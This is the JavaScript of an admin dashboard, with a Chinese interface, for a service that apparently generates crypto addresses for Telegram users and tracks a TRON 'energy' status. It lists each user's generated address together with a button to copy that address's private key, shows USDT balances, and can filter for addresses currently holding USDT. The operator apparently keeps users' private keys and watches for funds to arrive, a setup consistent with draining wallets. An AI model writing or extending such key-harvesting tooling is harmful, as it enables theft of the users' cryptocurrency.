const recordsBody = document.getElementById('recordsBody');
const statusText = document.getElementById('statusText');
const emptyText = document.getElementById('emptyText');
const refreshBtn = document.getElementById('refreshBtn');
const usdtFilterBtn = document.getElementById('usdtFilterBtn');
const totalCount = document.getElementById('totalCount');
const successCount = document.getElementById('successCount');
const pendingCount = document.getElementById('pendingCount');
const totalUsdt = document.getElementById('totalUsdt');
const blacklistForm = document.getElementById('blacklistForm');
const blacklistBody = document.getElementById('blacklistBody');
const blacklistEmpty = document.getElementById('blacklistEmpty');
let withUsdt = false;

function escapeHtml(value) {
  return String(value ?? '')
    .replaceAll('&', '&amp;')
    .replaceAll('<', '&lt;')
    .replaceAll('>', '&gt;')
    .replaceAll('"', '&quot;')
    .replaceAll("'", '&#39;');
}

function formatTime(value) {
  return value ? new Intl.DateTimeFormat('zh-CN', { dateStyle: 'short', timeStyle: 'medium' }).format(new Date(value)) : '-';
}

function shortText(value, size = 10) {
  const text = String(value || '');
  return text.length > size * 2 ? `${text.slice(0, size)}…${text.slice(-size)}` : text || '-';
}

function badge(status) {
  const type = status === 'COMPLETED' || status === 'success' ? 'success' : status === 'FAILED' || status === 'failed' ? 'danger' : 'pending';
  return `<span class="badge ${type}">${escapeHtml(status || '-')}</span>`;
}

async function copyText(text) {
  if (!text) return;
  await navigator.clipboard.writeText(text);
}

function renderRecords(records) {
  recordsBody.innerHTML = records.map((item) => `
    <tr>
      <td>${formatTime(item.runpodCreatedAt)}</td>
      <td><strong>${escapeHtml(item.userId)}</strong></td>
      <td>${badge(item.runpodStatus)}<br>${badge(item.energyStatus)}</td>
      <td><code title="${escapeHtml(item.fromAddress)}">${escapeHtml(shortText(item.fromAddress))}</code></td>
      <td><code title="${escapeHtml(item.resultAddress)}">${escapeHtml(shortText(item.resultAddress))}</code></td>
      <td><button class="copy-value" data-copy="${escapeHtml(item.privateKey)}" ${item.privateKey ? '' : 'disabled'}>复制私钥</button></td>
      <td><strong>${Number(item.usdtBalance || 0).toFixed(6)}</strong></td>
      <td>${escapeHtml(item.energyCount || '-')}</td>
    </tr>`).join('');
  emptyText.classList.toggle('hidden', records.length > 0);
  document.querySelectorAll('[data-copy]').forEach((button) => button.addEventListener('click', () => copyText(button.dataset.copy)));
}

async function loadRecords() {
  refreshBtn.disabled = true;
  statusText.textContent = '正在加载...';
  try {
    const res = await fetch(`/api/admin/records?limit=500&withUsdt=${withUsdt}`);
    const data = await res.json();
    if (!res.ok) throw new Error(data.error || '加载失败');
    renderRecords(data.records || []);
    const stats = data.stats || {};
    totalCount.textContent = stats.totalCount || 0;
    successCount.textContent = stats.successCount || 0;
    pendingCount.textContent = stats.pendingCount || 0;
    totalUsdt.textContent = Number(stats.totalUsdt || 0).toFixed(6);
    statusText.textContent = withUsdt ? `当前有 USDT 的返回地址：${data.records.length} 条` : `已加载 ${data.records.length} 条`;
  } catch (err) {
    statusText.textContent = err.message;
  } finally {
    refreshBtn.disabled = false;
  }
}

function renderBlacklist(users) {
  blacklistBody.innerHTML = users.map((user) => `
    <tr><td>${escapeHtml(user.userId)}</td><td>${escapeHtml(user.firstName || '-')}</td><td>${user.username ? `@${escapeHtml(user.username)}` : '-'}</td><td>${escapeHtml(user.reason)}</td><td>${user.source === 'automatic' ? '系统自动' : '手动'}</td><td>${formatTime(user.createdAt)}</td><td><button class="danger-btn" data-remove="${escapeHtml(user.userId)}">移除</button></td></tr>`).join('');
  blacklistEmpty.classList.toggle('hidden', users.length > 0);
  document.querySelectorAll('[data-remove]').forEach((button) => button.addEventListener('click', async () => {
    if (!window.confirm(`确认移除用户 ${button.dataset.remove}？`)) return;
    await fetch(`/api/admin/blacklist/${encodeURIComponent(button.dataset.remove)}`, { method: 'DELETE' });
    await loadBlacklist();
  }));
}

async function loadBlacklist() {
  const res = await fetch('/api/admin/blacklist');
  const data = await res.json();
  if (res.ok) renderBlacklist(data.users || []);
}

blacklistForm.addEventListener('submit', async (event) => {
  event.preventDefault();
  const body = {
    userId: document.getElementById('blacklistUserId').value.trim(),
    firstName: document.getElementById('blacklistFirstName').value.trim(),
    username: document.getElementById('blacklistUsername').value.trim(),
    reason: document.getElementById('blacklistReason').value.trim(),
  };
  const res = await fetch('/api/admin/blacklist', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) });
  const data = await res.json();
  if (!res.ok) return window.alert(data.error || '添加失败');
  blacklistForm.reset();
  await loadBlacklist();
});

document.querySelectorAll('[data-view]').forEach((button) => button.addEventListener('click', () => {
  document.querySelectorAll('[data-view]').forEach((item) => item.classList.remove('active'));
  document.querySelectorAll('.admin-view').forEach((view) => view.classList.remove('active'));
  button.classList.add('active');
  document.getElementById(button.dataset.view).classList.add('active');
  if (button.dataset.view === 'blacklistView') loadBlacklist();
}));

usdtFilterBtn.addEventListener('click', () => {
  withUsdt = !withUsdt;
  usdtFilterBtn.classList.toggle('active', withUsdt);
  usdtFilterBtn.textContent = withUsdt ? '显示全部记录' : '只看当前有 USDT';
  loadRecords();
});
refreshBtn.addEventListener('click', () => Promise.all([loadRecords(), loadBlacklist()]));
loadRecords();
loadBlacklist();
